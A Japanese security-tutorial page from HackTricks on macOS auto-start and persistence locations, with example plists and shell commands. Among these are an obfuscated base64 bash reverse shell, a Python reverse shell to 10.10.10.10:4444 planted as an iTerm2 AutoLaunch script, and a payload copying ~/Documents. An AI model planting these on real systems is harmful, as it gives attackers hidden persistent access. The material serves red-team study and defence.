# macOS 自動起動

{{#include ../banners/hacktricks-training.md}}

このセクションは、ブログシリーズ [**Beyond the good ol' LaunchAgents**](https://theevilbit.github.io/beyond/) に大きく基づいており、**より多くの自動起動場所**を追加すること（可能であれば）、最新のmacOS（13.4）で**どの技術がまだ機能しているか**を示し、必要な**権限**を特定することを目的としています。

## サンドボックスバイパス

> [!TIP]
> ここでは、**サンドボックスバイパス**に役立つ起動場所を見つけることができ、**ファイルに書き込む**ことによって何かを単純に実行し、非常に**一般的な****アクション**、特定の**時間**、または通常サンドボックス内から**ルート権限なしで実行できるアクション**を**待つ**ことができます。

### Launchd

- サンドボックスをバイパスするのに役立つ: [✅](https://emojipedia.org/check-mark-button)
- TCCバイパス: [🔴](https://emojipedia.org/large-red-circle)

#### 場所

- **`/Library/LaunchAgents`**
- **トリガー**: 再起動
- ルートが必要
- **`/Library/LaunchDaemons`**
- **トリガー**: 再起動
- ルートが必要
- **`/System/Library/LaunchAgents`**
- **トリガー**: 再起動
- ルートが必要
- **`/System/Library/LaunchDaemons`**
- **トリガー**: 再起動
- ルートが必要
- **`~/Library/LaunchAgents`**
- **トリガー**: 再ログイン
- **`~/Library/LaunchDemons`**
- **トリガー**: 再ログイン

> [!TIP]
> 興味深い事実として、**`launchd`** には、他のよく知られたサービスを起動するために必要な埋め込まれたプロパティリストがMach-oセクション `__Text.__config` に含まれています。さらに、これらのサービスには `RequireSuccess`、`RequireRun`、`RebootOnSuccess` が含まれており、これらは実行され、成功裏に完了する必要があることを意味します。
>
> もちろん、コード署名のために変更することはできません。

#### 説明と悪用

**`launchd`** は、起動時にOX Sカーネルによって実行される**最初の** **プロセス**であり、シャットダウン時に終了する**最後の**プロセスです。常に**PID 1**を持つべきです。このプロセスは、次の**ASEP** **plist**に示された設定を**読み取り、実行**します：

- `/Library/LaunchAgents`: 管理者によってインストールされたユーザーごとのエージェント
- `/Library/LaunchDaemons`: 管理者によってインストールされたシステム全体のデーモン
- `/System/Library/LaunchAgents`: Appleによって提供されたユーザーごとのエージェント
- `/System/Library/LaunchDaemons`: Appleによって提供されたシステム全体のデーモン

ユーザーがログインすると、`/Users/$USER/Library/LaunchAgents` および `/Users/$USER/Library/LaunchDemons` にあるplistが**ログインしたユーザーの権限**で開始されます。

**エージェントとデーモンの主な違いは、エージェントはユーザーがログインしたときに読み込まれ、デーモンはシステム起動時に読み込まれる**ことです（sshのようなサービスは、ユーザーがシステムにアクセスする前に実行する必要があります）。また、エージェントはGUIを使用できる一方で、デーモンはバックグラウンドで実行する必要があります。
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN">
<plist version="1.0">
<dict>
<key>Label</key>
<string>com.apple.someidentifier</string>
<key>ProgramArguments</key>
<array>
<string>bash -c 'touch /tmp/launched'</string> <!--Prog to execute-->
</array>
<key>RunAtLoad</key><true/> <!--Execute at system startup-->
<key>StartInterval</key>
<integer>800</integer> <!--Execute each 800s-->
<key>KeepAlive</key>
<dict>
<key>SuccessfulExit</key></false> <!--Re-execute if exit unsuccessful-->
<!--If previous is true, then re-execute in successful exit-->
</dict>
</dict>
</plist>
```
**エージェントはユーザーがログインする前に実行される必要がある場合があり**、これらは**PreLoginAgents**と呼ばれます。例えば、これはログイン時に支援技術を提供するのに便利です。これらは`/Library/LaunchAgents`にも見つけることができます（例は[**こちら**](https://github.com/HelmutJ/CocoaSampleCode/tree/master/PreLoginAgents)を参照）。

> [!NOTE]
> 新しいデーモンまたはエージェントの設定ファイルは、**次回の再起動後または** `launchctl load <target.plist>`を使用して**読み込まれます**。**拡張子なしの.plistファイルを読み込むことも可能です** `launchctl -F <file>`（ただし、これらのplistファイルは再起動後に自動的には読み込まれません）。\
> `launchctl unload <target.plist>`を使用して**アンロード**することも可能です（それによって指摘されたプロセスは終了します）。
>
> **エージェント**または**デーモン**が**実行されない**ように**何も**（オーバーライドなど）が**ないことを確認するために**、次のコマンドを実行します：`sudo launchctl load -w /System/Library/LaunchDaemos/com.apple.smdb.plist`

現在のユーザーによって読み込まれているすべてのエージェントとデーモンをリストします：
```bash
launchctl list
```
> [!WARNING]
> plistがユーザーによって所有されている場合、たとえそれがデーモンのシステム全体のフォルダーにあっても、**タスクはユーザーとして実行され**、rootとしては実行されません。これにより、一部の特権昇格攻撃を防ぐことができます。

#### launchdに関する詳細

**`launchd`**は、**カーネル**から開始される**最初の**ユーザーモードプロセスです。プロセスの開始は**成功**しなければならず、**終了したりクラッシュしたりしてはいけません**。それは一部の**終了シグナル**からも**保護されています**。

`launchd`が最初に行うことの1つは、次のようなすべての**デーモン**を**開始**することです：

- 実行される時間に基づく**タイマーデーモン**：
- atd (`com.apple.atrun.plist`): `StartInterval`が30分
- crond (`com.apple.systemstats.daily.plist`): `StartCalendarInterval`が00:15に開始
- **ネットワークデーモン**：
- `org.cups.cups-lpd`: TCPでリッスン（`SockType: stream`）し、`SockServiceName: printer`
- SockServiceNameは、`/etc/services`のポートまたはサービスでなければなりません
- `com.apple.xscertd.plist`: TCPのポート1640でリッスン
- **指定されたパスが変更されたときに実行されるパスデーモン**：
- `com.apple.postfix.master`: パス`/etc/postfix/aliases`をチェック
- **IOKit通知デーモン**：
- `com.apple.xartstorageremoted`: `"com.apple.iokit.matching" => { "com.apple.device-attach" => { "IOMatchLaunchStream" => 1 ...`
- **Machポート**：
- `com.apple.xscertd-helper.plist`: `MachServices`エントリに`com.apple.xscertd.helper`という名前を示しています
- **UserEventAgent**：
- これは前のものとは異なります。特定のイベントに応じてlaunchdがアプリを生成します。しかし、この場合、関与するメインバイナリは`launchd`ではなく`/usr/libexec/UserEventAgent`です。これは、SIP制限フォルダー/System/Library/UserEventPlugins/からプラグインをロードし、各プラグインは`XPCEventModuleInitializer`キーに初期化子を示すか、古いプラグインの場合は`Info.plist`の`FB86416D-6164-2070-726F-70735C216EC0`キーの下の`CFPluginFactories`辞書に示します。

### シェルスタートアップファイル

Writeup: [https://theevilbit.github.io/beyond/beyond_0001/](https://theevilbit.github.io/beyond/beyond_0001/)\
Writeup (xterm): [https://theevilbit.github.io/beyond/beyond_0018/](https://theevilbit.github.io/beyond/beyond_0018/)

- サンドボックスをバイパスするのに便利: [✅](https://emojipedia.org/check-mark-button)
- TCCバイパス: [✅](https://emojipedia.org/check-mark-button)
- ただし、これらのファイルを読み込むシェルを実行するTCCバイパスを持つアプリを見つける必要があります

#### ロケーション

- **`~/.zshrc`, `~/.zlogin`, `~/.zshenv.zwc`**, **`~/.zshenv`, `~/.zprofile`**
- **トリガー**: zshでターミナルを開く
- **`/etc/zshenv`, `/etc/zprofile`, `/etc/zshrc`, `/etc/zlogin`**
- **トリガー**: zshでターミナルを開く
- rootが必要
- **`~/.zlogout`**
- **トリガー**: zshでターミナルを終了する
- **`/etc/zlogout`**
- **トリガー**: zshでターミナルを終了する
- rootが必要
- おそらくさらに多くは: **`man zsh`**
- **`~/.bashrc`**
- **トリガー**: bashでターミナルを開く
- `/etc/profile`（動作しなかった）
- `~/.profile`（動作しなかった）
- `~/.xinitrc`, `~/.xserverrc`, `/opt/X11/etc/X11/xinit/xinitrc.d/`
- **トリガー**: xtermでトリガーされることが期待されますが、**インストールされていません**。インストール後もこのエラーが発生します: xterm: `DISPLAY is not set`

#### 説明と悪用

`zsh`や`bash`などのシェル環境を開始すると、**特定のスタートアップファイルが実行されます**。macOSは現在、デフォルトシェルとして`/bin/zsh`を使用しています。このシェルは、ターミナルアプリケーションが起動されたときや、デバイスがSSH経由でアクセスされたときに自動的にアクセスされます。`bash`や`sh`もmacOSに存在しますが、使用するには明示的に呼び出す必要があります。

zshのマニュアルページは、**`man zsh`**で読むことができ、スタートアップファイルの長い説明があります。
```bash
# Example executino via ~/.zshrc
echo "touch /tmp/hacktricks" >> ~/.zshrc
```
### 再オープンされたアプリケーション

> [!CAUTION]
> 指定されたエクスプロイトの設定とログアウトおよびログイン、または再起動を行っても、アプリを実行することはできませんでした。（アプリが実行されていなかったため、これらのアクションが実行されるときに実行されている必要があるかもしれません）

**Writeup**: [https://theevilbit.github.io/beyond/beyond_0021/](https://theevilbit.github.io/beyond/beyond_0021/)

- サンドボックスをバイパスするのに便利: [✅](https://emojipedia.org/check-mark-button)
- TCCバイパス: [🔴](https://emojipedia.org/large-red-circle)

#### 場所

- **`~/Library/Preferences/ByHost/com.apple.loginwindow.<UUID>.plist`**
- **トリガー**: アプリケーションの再起動

#### 説明とエクスプロイト

再オープンされるすべてのアプリケーションは、plist `~/Library/Preferences/ByHost/com.apple.loginwindow.<UUID>.plist` 内にあります。

したがって、再オープンされるアプリケーションに自分のアプリを起動させるには、**リストにアプリを追加するだけ**です。

UUIDは、そのディレクトリをリスト表示するか、`ioreg -rd1 -c IOPlatformExpertDevice | awk -F'"' '/IOPlatformUUID/{print $4}'` を使用して見つけることができます。

再オープンされるアプリケーションを確認するには、次のようにします:
```bash
defaults -currentHost read com.apple.loginwindow TALAppsToRelaunchAtLogin
#or
plutil -p ~/Library/Preferences/ByHost/com.apple.loginwindow.<UUID>.plist
```
このリストに**アプリケーションを追加する**には、次のようにします：
```bash
# Adding iTerm2
/usr/libexec/PlistBuddy -c "Add :TALAppsToRelaunchAtLogin: dict" \
-c "Set :TALAppsToRelaunchAtLogin:$:BackgroundState 2" \
-c "Set :TALAppsToRelaunchAtLogin:$:BundleID com.googlecode.iterm2" \
-c "Set :TALAppsToRelaunchAtLogin:$:Hide 0" \
-c "Set :TALAppsToRelaunchAtLogin:$:Path /Applications/iTerm.app" \
~/Library/Preferences/ByHost/com.apple.loginwindow.<UUID>.plist
```
### ターミナルの設定

- サンドボックスをバイパスするのに便利: [✅](https://emojipedia.org/check-mark-button)
- TCCバイパス: [✅](https://emojipedia.org/check-mark-button)
- ターミナルはユーザーが使用するFDA権限を持っている

#### 場所

- **`~/Library/Preferences/com.apple.Terminal.plist`**
- **トリガー**: ターミナルを開く

#### 説明と悪用

**`~/Library/Preferences`** にはアプリケーションのユーザー設定が保存されています。これらの設定のいくつかは、**他のアプリケーション/スクリプトを実行する**ための構成を保持することができます。

例えば、ターミナルはスタートアップでコマンドを実行できます:

<figure><img src="../images/image (1148).png" alt="" width="495"><figcaption></figcaption></figure>

この設定は、**`~/Library/Preferences/com.apple.Terminal.plist`** ファイルに次のように反映されます:
```bash
[...]
"Window Settings" => {
"Basic" => {
"CommandString" => "touch /tmp/terminal_pwn"
"Font" => {length = 267, bytes = 0x62706c69 73743030 d4010203 04050607 ... 00000000 000000cf }
"FontAntialias" => 1
"FontWidthSpacing" => 1.004032258064516
"name" => "Basic"
"ProfileCurrentVersion" => 2.07
"RunCommandAsShell" => 0
"type" => "Window Settings"
}
[...]
```
したがって、システムのターミナルの設定のplistが上書きできる場合、**`open`** 機能を使用して **ターミナルを開き、そのコマンドが実行されます**。

これをCLIから追加できます:
```bash
# Add
/usr/libexec/PlistBuddy -c "Set :\"Window Settings\":\"Basic\":\"CommandString\" 'touch /tmp/terminal-start-command'" $HOME/Library/Preferences/com.apple.Terminal.plist
/usr/libexec/PlistBuddy -c "Set :\"Window Settings\":\"Basic\":\"RunCommandAsShell\" 0" $HOME/Library/Preferences/com.apple.Terminal.plist

# Remove
/usr/libexec/PlistBuddy -c "Set :\"Window Settings\":\"Basic\":\"CommandString\" ''" $HOME/Library/Preferences/com.apple.Terminal.plist
```
### Terminal Scripts / Other file extensions

- サンドボックスをバイパスするのに便利: [✅](https://emojipedia.org/check-mark-button)
- TCCバイパス: [✅](https://emojipedia.org/check-mark-button)
- ユーザーが使用するFDA権限を持つターミナル

#### Location

- **Anywhere**
- **Trigger**: Open Terminal

#### Description & Exploitation

[**`.terminal`** スクリプト](https://stackoverflow.com/questions/32086004/how-to-use-the-default-terminal-settings-when-opening-a-terminal-file-osx)を作成して開くと、**Terminal application**が自動的に起動し、そこに示されたコマンドが実行されます。ターミナルアプリが特別な権限（TCCなど）を持っている場合、あなたのコマンドはその特別な権限で実行されます。

Try it with:
```bash
# Prepare the payload
cat > /tmp/test.terminal << EOF
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
<key>CommandString</key>
<string>mkdir /tmp/Documents; cp -r ~/Documents /tmp/Documents;</string>
<key>ProfileCurrentVersion</key>
<real>2.0600000000000001</real>
<key>RunCommandAsShell</key>
<false/>
<key>name</key>
<string>exploit</string>
<key>type</key>
<string>Window Settings</string>
</dict>
</plist>
EOF

# Trigger it
open /tmp/test.terminal

# Use something like the following for a reverse shell:
<string>echo -n "YmFzaCAtaSA+JiAvZGV2L3RjcC8xMjcuMC4wLjEvNDQ0NCAwPiYxOw==" | base64 -d | bash;</string>
```
あなたはまた、通常のシェルスクリプトの内容を持つ拡張子 **`.command`**、**`.tool`** を使用することができ、これらもTerminalによって開かれます。

> [!CAUTION]
> Terminalが**フルディスクアクセス**を持っている場合、そのアクションを完了することができます（実行されたコマンドはターミナルウィンドウに表示されることに注意してください）。

### オーディオプラグイン

Writeup: [https://theevilbit.github.io/beyond/beyond_0013/](https://theevilbit.github.io/beyond/beyond_0013/)\
Writeup: [https://posts.specterops.io/audio-unit-plug-ins-896d3434a882](https://posts.specterops.io/audio-unit-plug-ins-896d3434a882)

- サンドボックスをバイパスするのに便利: [✅](https://emojipedia.org/check-mark-button)
- TCCバイパス: [🟠](https://emojipedia.org/large-orange-circle)
- 追加のTCCアクセスを得ることができるかもしれません

#### ロケーション

- **`/Library/Audio/Plug-Ins/HAL`**
- ルートが必要
- **トリガー**: coreaudiodまたはコンピュータを再起動
- **`/Library/Audio/Plug-ins/Components`**
- ルートが必要
- **トリガー**: coreaudiodまたはコンピュータを再起動
- **`~/Library/Audio/Plug-ins/Components`**
- **トリガー**: coreaudiodまたはコンピュータを再起動
- **`/System/Library/Components`**
- ルートが必要
- **トリガー**: coreaudiodまたはコンピュータを再起動

#### 説明

以前の書き込みによると、**いくつかのオーディオプラグインをコンパイル**し、それらをロードすることが可能です。

### QuickLookプラグイン

Writeup: [https://theevilbit.github.io/beyond/beyond_0028/](https://theevilbit.github.io/beyond/beyond_0028/)

- サンドボックスをバイパスするのに便利: [✅](https://emojipedia.org/check-mark-button)
- TCCバイパス: [🟠](https://emojipedia.org/large-orange-circle)
- 追加のTCCアクセスを得ることができるかもしれません

#### ロケーション

- `/System/Library/QuickLook`
- `/Library/QuickLook`
- `~/Library/QuickLook`
- `/Applications/AppNameHere/Contents/Library/QuickLook/`
- `~/Applications/AppNameHere/Contents/Library/QuickLook/`

#### 説明と悪用

QuickLookプラグインは、**ファイルのプレビューをトリガーしたとき**（Finderでファイルを選択してスペースバーを押す）に実行され、**そのファイルタイプをサポートするプラグイン**がインストールされている必要があります。

自分のQuickLookプラグインをコンパイルし、前述のいずれかの場所に配置してロードし、サポートされているファイルに移動してスペースを押してトリガーすることが可能です。

### ~~ログイン/ログアウトフック~~

> [!CAUTION]
> これは私には機能しませんでした。ユーザーログインフックでもルートログアウトフックでもありませんでした

**Writeup**: [https://theevilbit.github.io/beyond/beyond_0022/](https://theevilbit.github.io/beyond/beyond_0022/)

- サンドボックスをバイパスするのに便利: [✅](https://emojipedia.org/check-mark-button)
- TCCバイパス: [🔴](https://emojipedia.org/large-red-circle)

#### ロケーション

- `defaults write com.apple.loginwindow LoginHook /Users/$USER/hook.sh`のようなものを実行できる必要があります
- `~/Library/Preferences/com.apple.loginwindow.plist`にあります

これらは非推奨ですが、ユーザーがログインするときにコマンドを実行するために使用できます。
```bash
cat > $HOME/hook.sh << EOF
#!/bin/bash
echo 'My is: \`id\`' > /tmp/login_id.txt
EOF
chmod +x $HOME/hook.sh
defaults write com.apple.loginwindow LoginHook /Users/$USER/hook.sh
defaults write com.apple.loginwindow LogoutHook /Users/$USER/hook.sh
```
この設定は `/Users/$USER/Library/Preferences/com.apple.loginwindow.plist` に保存されます。
```bash
defaults read /Users/$USER/Library/Preferences/com.apple.loginwindow.plist
{
LoginHook = "/Users/username/hook.sh";
LogoutHook = "/Users/username/hook.sh";
MiniBuddyLaunch = 0;
TALLogoutReason = "Shut Down";
TALLogoutSavesState = 0;
oneTimeSSMigrationComplete = 1;
}
```
削除するには：
```bash
defaults delete com.apple.loginwindow LoginHook
defaults delete com.apple.loginwindow LogoutHook
```
ルートユーザーのものは **`/private/var/root/Library/Preferences/com.apple.loginwindow.plist`** に保存されています。

## 条件付きサンドボックスバイパス

> [!TIP]
> ここでは、**サンドボックスバイパス** に役立つスタートロケーションを見つけることができ、**ファイルに書き込む** ことで何かを単純に実行し、特定の **プログラムがインストールされている、"珍しい" ユーザー** アクションや環境のような **あまり一般的でない条件** を期待することができます。

### Cron

**Writeup**: [https://theevilbit.github.io/beyond/beyond_0004/](https://theevilbit.github.io/beyond/beyond_0004/)

- サンドボックスをバイパスするのに役立ちます: [✅](https://emojipedia.org/check-mark-button)
- ただし、`crontab` バイナリを実行できる必要があります
- またはルートである必要があります
- TCCバイパス: [🔴](https://emojipedia.org/large-red-circle)

#### ロケーション

- **`/usr/lib/cron/tabs/`, `/private/var/at/tabs`, `/private/var/at/jobs`, `/etc/periodic/`**
- 直接書き込みアクセスにはルートが必要です。`crontab <file>` を実行できる場合はルートは不要です
- **トリガー**: cronジョブに依存します

#### 説明と悪用

現在のユーザーのcronジョブをリストするには:
```bash
crontab -l
```
ユーザーのすべてのcronジョブは**`/usr/lib/cron/tabs/`**および**`/var/at/tabs/`**で見ることができます（root権限が必要です）。

MacOSでは、**特定の頻度**でスクリプトを実行するいくつかのフォルダーが見つかります:
```bash
# The one with the cron jobs is /usr/lib/cron/tabs/
ls -lR /usr/lib/cron/tabs/ /private/var/at/jobs /etc/periodic/
```
そこでは、通常の **cron** **ジョブ**、**at** **ジョブ**（あまり使用されない）、および **periodic** **ジョブ**（主に一時ファイルのクリーンアップに使用される）を見つけることができます。毎日の定期ジョブは、例えば `periodic daily` で実行できます。

**ユーザークロンジョブをプログラム的に追加する**には、次のようにすることができます：
```bash
echo '* * * * * /bin/bash -c "touch /tmp/cron3"' > /tmp/cron
crontab /tmp/cron
```
### iTerm2

Writeup: [https://theevilbit.github.io/beyond/beyond_0002/](https://theevilbit.github.io/beyond/beyond_0002/)

- サンドボックスをバイパスするのに便利: [✅](https://emojipedia.org/check-mark-button)
- TCCバイパス: [✅](https://emojipedia.org/check-mark-button)
- iTerm2はTCC権限が付与されていた

#### Locations

- **`~/Library/Application Support/iTerm2/Scripts/AutoLaunch`**
- **Trigger**: iTermを開く
- **`~/Library/Application Support/iTerm2/Scripts/AutoLaunch.scpt`**
- **Trigger**: iTermを開く
- **`~/Library/Preferences/com.googlecode.iterm2.plist`**
- **Trigger**: iTermを開く

#### Description & Exploitation

**`~/Library/Application Support/iTerm2/Scripts/AutoLaunch`**に保存されたスクリプトは実行されます。例えば:
```bash
cat > "$HOME/Library/Application Support/iTerm2/Scripts/AutoLaunch/a.sh" << EOF
#!/bin/bash
touch /tmp/iterm2-autolaunch
EOF

chmod +x "$HOME/Library/Application Support/iTerm2/Scripts/AutoLaunch/a.sh"
```
または：
```bash
cat > "$HOME/Library/Application Support/iTerm2/Scripts/AutoLaunch/a.py" << EOF
#!/usr/bin/env python3
import iterm2,socket,subprocess,os

async def main(connection):
s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(('10.10.10.10',4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(['zsh','-i']);
async with iterm2.CustomControlSequenceMonitor(
connection, "shared-secret", r'^create-window$') as mon:
while True:
match = await mon.async_get()
await iterm2.Window.async_create(connection)

iterm2.run_forever(main)
EOF
```
スクリプト **`~/Library/Application Support/iTerm2/Scripts/AutoLaunch.scpt`** も実行されます：
```bash
do shell script "touch /tmp/iterm2-autolaunchscpt"
```
**`~/Library/Preferences/com.googlecode.iterm2.plist`** にある iTerm2 の設定は、iTerm2 ターミナルが開かれたときに **実行するコマンドを示す** ことができます。

この設定は iTerm2 の設定で構成できます：

<figure><img src="../images/image (37).png" alt="" width="563"><figcaption></figcaption></figure>

そして、そのコマンドは設定に反映されます：
```bash
plutil -p com.googlecode.iterm2.plist
{
[...]
"New Bookmarks" => [
0 => {
[...]
"Initial Text" => "touch /tmp/iterm-start-command"
```
コマンドを実行するには、次のように設定できます:
```bash
# Add
/usr/libexec/PlistBuddy -c "Set :\"New Bookmarks\":0:\"Initial Text\" 'touch /tmp/iterm-start-command'" $HOME/Library/Preferences/com.googlecode.iterm2.plist

# Call iTerm
open /Applications/iTerm.app/Contents/MacOS/iTerm2

# Remove
/usr/libexec/PlistBuddy -c "Set :\"New Bookmarks\":0:\"Initial Text\" ''" $HOME/Library/Preferences/com.googlecode.iterm2.plist
```
> [!WARNING]
> iTerm2の設定を悪用して任意のコマンドを実行する**他の方法がある可能性が高い**です。

### xbar

Writeup: [https://theevilbit.github.io/beyond/beyond_0007/](https://theevilbit.github.io/beyond/beyond_0007/)

- サンドボックスをバイパスするのに便利: [✅](https://emojipedia.org/check-mark-button)
- ただしxbarをインストールする必要があります
- TCCバイパス: [✅](https://emojipedia.org/check-mark-button)
- アクセシビリティの権限を要求します

#### Location

- **`~/Library/Application\ Support/xbar/plugins/`**
- **Trigger**: xbarが実行されるとき

#### Description

人気のプログラム[**xbar**](https://github.com/matryer/xbar)がインストールされている場合、**`~/Library/Application\ Support/xbar/plugins/`**にシェルスクリプトを書くことができ、xbarが起動するときに実行されます:
```bash
cat > "$HOME/Library/Application Support/xbar/plugins/a.sh" << EOF
#!/bin/bash
touch /tmp/xbar
EOF
chmod +x "$HOME/Library/Application Support/xbar/plugins/a.sh"
```
### Hammerspoon

**Writeup**: [https://theevilbit.github.io/beyond/beyond_0008/](https://theevilbit.github.io/beyond/beyond_0008/)

- サンドボックスをバイパスするのに便利: [✅](https://emojipedia.org/check-mark-button)
- しかし、Hammerspoonはインストールされている必要があります
- TCCバイパス: [✅](https://emojipedia.org/check-mark-button)
- アクセシビリティの権限を要求します

#### Location

- **`~/.hammerspoon/init.lua`**
- **Trigger**: Hammerspoonが実行されるとき

#### Description

[**Hammerspoon**](https://github.com/Hammerspoon/hammerspoon)は、**macOS**のための自動化プラットフォームとして機能し、**LUAスクリプト言語**をその操作に利用します。特に、完全なAppleScriptコードの統合とシェルスクリプトの実行をサポートし、スクリプト機能を大幅に強化しています。

アプリは単一のファイル`~/.hammerspoon/init.lua`を探し、起動時にスクリプトが実行されます。
```bash
mkdir -p "$HOME/.hammerspoon"
cat > "$HOME/.hammerspoon/init.lua" << EOF
hs.execute("/Applications/iTerm.app/Contents/MacOS/iTerm2")
EOF
```
### BetterTouchTool

- サンドボックスをバイパスするのに便利: [✅](https://emojipedia.org/check-mark-button)
- しかし、BetterTouchToolをインストールする必要があります
- TCCバイパス: [✅](https://emojipedia.org/check-mark-button)
- Automation-ShortcutsとAccessibilityの権限を要求します

#### Location

- `~/Library/Application Support/BetterTouchTool/*`

このツールは、特定のショートカットが押されたときに実行するアプリケーションやスクリプトを指定することを可能にします。攻撃者は、**データベース内で実行するためのショートカットとアクションを構成することができるかもしれません**（ショートカットは単にキーを押すことかもしれません）。

### Alfred

- サンドボックスをバイパスするのに便利: [✅](https://emojipedia.org/check-mark-button)
- しかし、Alfredをインストールする必要があります
- TCCバイパス: [✅](https://emojipedia.org/check-mark-button)
- Automation、Accessibility、さらにはFull-Diskアクセスの権限を要求します

#### Location

- `???`

特定の条件が満たされたときにコードを実行できるワークフローを作成することができます。攻撃者がワークフローファイルを作成し、Alfredにそれを読み込ませることが可能かもしれません（ワークフローを使用するにはプレミアム版を購入する必要があります）。

### SSHRC

Writeup: [https://theevilbit.github.io/beyond/beyond_0006/](https://theevilbit.github.io/beyond/beyond_0006/)

- サンドボックスをバイパスするのに便利: [✅](https://emojipedia.org/check-mark-button)
- しかし、sshを有効にして使用する必要があります
- TCCバイパス: [✅](https://emojipedia.org/check-mark-button)
- SSHはFDAアクセスを持っていました

#### Location

- **`~/.ssh/rc`**
- **Trigger**: ssh経由でのログイン
- **`/etc/ssh/sshrc`**
- ルートが必要
- **Trigger**: ssh経由でのログイン

> [!CAUTION]
> sshをオンにするにはFull Disk Accessが必要です:
>
> ```bash
> sudo systemsetup -setremotelogin on
> ```

#### Description & Exploitation

デフォルトでは、`/etc/ssh/sshd_config`に`PermitUserRC no`がない限り、ユーザーが**SSH経由でログイン**すると、スクリプト**`/etc/ssh/sshrc`**と**`~/.ssh/rc`**が実行されます。

### **Login Items**

Writeup: [https://theevilbit.github.io/beyond/beyond_0003/](https://theevilbit.github.io/beyond/beyond_0003/)

- サンドボックスをバイパスするのに便利: [✅](https://emojipedia.org/check-mark-button)
- しかし、引数付きで`osascript`を実行する必要があります
- TCCバイパス: [🔴](https://emojipedia.org/large-red-circle)

#### Locations

- **`~/Library/Application Support/com.apple.backgroundtaskmanagementagent`**
- **Trigger:** ログイン
- **`osascript`**を呼び出すエクスプロイトペイロードが保存されます
- **`/var/db/com.apple.xpc.launchd/loginitems.501.plist`**
- **Trigger:** ログイン
- ルートが必要

#### Description

システム環境設定 -> ユーザーとグループ -> **Login Items** で、**ユーザーがログインしたときに実行されるアイテム**を見つけることができます。\
それらをリストし、コマンドラインから追加および削除することが可能です:
```bash
#List all items:
osascript -e 'tell application "System Events" to get the name of every login item'

#Add an item:
osascript -e 'tell application "System Events" to make login item at end with properties {path:"/path/to/itemname", hidden:false}'

#Remove an item:
osascript -e 'tell application "System Events" to delete login item "itemname"'
```
これらのアイテムはファイル **`~/Library/Application Support/com.apple.backgroundtaskmanagementagent`** に保存されています。

**ログインアイテム** は、API [SMLoginItemSetEnabled](https://developer.apple.com/documentation/servicemanagement/1501557-smloginitemsetenabled?language=objc) を使用しても示されることがあり、設定は **`/var/db/com.apple.xpc.launchd/loginitems.501.plist`** に保存されます。

### ZIPをログインアイテムとして

（ログインアイテムに関する前のセクションを参照してください、これは拡張です）

**ZIP** ファイルを **ログインアイテム** として保存すると、**`Archive Utility`** がそれを開き、例えば ZIP が **`~/Library`** に保存されていて、**`LaunchAgents/file.plist`** フォルダーにバックドアが含まれている場合、そのフォルダーが作成され（デフォルトでは作成されません）、plist が追加されるため、次回ユーザーが再ログインすると、**plist に示されたバックドアが実行されます**。

別のオプションは、ユーザーの HOME 内に **`.bash_profile`** と **`.zshenv`** ファイルを作成することで、LaunchAgents フォルダーがすでに存在する場合でもこの技術は機能します。

### at

Writeup: [https://theevilbit.github.io/beyond/beyond_0014/](https://theevilbit.github.io/beyond/beyond_0014/)

- サンドボックスをバイパスするのに便利: [✅](https://emojipedia.org/check-mark-button)
- しかし、**`at`** を **実行** する必要があり、**有効** でなければなりません
- TCC バイパス: [🔴](https://emojipedia.org/large-red-circle)

#### 場所

- **`at`** を **実行** する必要があり、**有効** でなければなりません

#### **説明**

`at` タスクは、特定の時間に実行される **一度限りのタスクをスケジュールする** ために設計されています。cron ジョブとは異なり、`at` タスクは実行後に自動的に削除されます。これらのタスクはシステムの再起動を超えて持続するため、特定の条件下で潜在的なセキュリティ上の懸念としてマークされることが重要です。

**デフォルト** では **無効** ですが、**root** ユーザーは **それらを有効** にすることができます:
```bash
sudo launchctl load -F /System/Library/LaunchDaemons/com.apple.atrun.plist
```
これは1時間後にファイルを作成します：
```bash
echo "echo 11 > /tmp/at.txt" | at now+1
```
`atq`を使用してジョブキューを確認します：
```shell-session
sh-3.2# atq
26	Tue Apr 27 00:46:00 2021
22	Wed Apr 28 00:29:00 2021
```
上記には2つのジョブがスケジュールされています。ジョブの詳細は `at -c JOBNUMBER` を使用して印刷できます。
```shell-session
sh-3.2# at -c 26
#!/bin/sh
# atrun uid=0 gid=0
# mail csaby 0
umask 22
SHELL=/bin/sh; export SHELL
TERM=xterm-256color; export TERM
USER=root; export USER
SUDO_USER=csaby; export SUDO_USER
SUDO_UID=501; export SUDO_UID
SSH_AUTH_SOCK=/private/tmp/com.apple.launchd.co51iLHIjf/Listeners; export SSH_AUTH_SOCK
__CF_USER_TEXT_ENCODING=0x0:0:0; export __CF_USER_TEXT_ENCODING
MAIL=/var/mail/root; export MAIL
PATH=/usr/local/bin:/usr/bin:/bin:/usr/sbin:/sbin; export PATH
PWD=/Users/csaby; export PWD
SHLVL=1; export SHLVL
SUDO_COMMAND=/usr/bin/su; export SUDO_COMMAND
HOME=/var/root; export HOME
LOGNAME=root; export LOGNAME
LC_CTYPE=UTF-8; export LC_CTYPE
SUDO_GID=20; export SUDO_GID
_=/usr/bin/at; export _
cd /Users/csaby || {
echo 'Execution directory inaccessible' >&2
exit 1
}
unset OLDPWD
echo 11 > /tmp/at.txt
```
> [!WARNING]
> ATタスクが有効でない場合、作成されたタスクは実行されません。

**ジョブファイル**は`/private/var/at/jobs/`にあります。
```
sh-3.2# ls -l /private/var/at/jobs/
total 32
-rw-r--r--  1 root  wheel    6 Apr 27 00:46 .SEQ
-rw-------  1 root  wheel    0 Apr 26 23:17 .lockfile
-r--------  1 root  wheel  803 Apr 27 00:46 a00019019bdcd2
-rwx------  1 root  wheel  803 Apr 27 00:46 a0001a019bdcd2
```
ファイル名にはキュー、ジョブ番号、および実行予定の時間が含まれています。例えば、`a0001a019bdcd2`を見てみましょう。

- `a` - これはキューです
- `0001a` - ジョブ番号（16進数）、`0x1a = 26`
- `019bdcd2` - 時間（16進数）。エポックから経過した分を表します。`0x019bdcd2`は10進数で`26991826`です。これに60を掛けると`1619509560`になり、`GMT: 2021年4月27日、火曜日 7:46:00`となります。

ジョブファイルを印刷すると、`at -c`を使用して得たのと同じ情報が含まれていることがわかります。

### フォルダーアクション

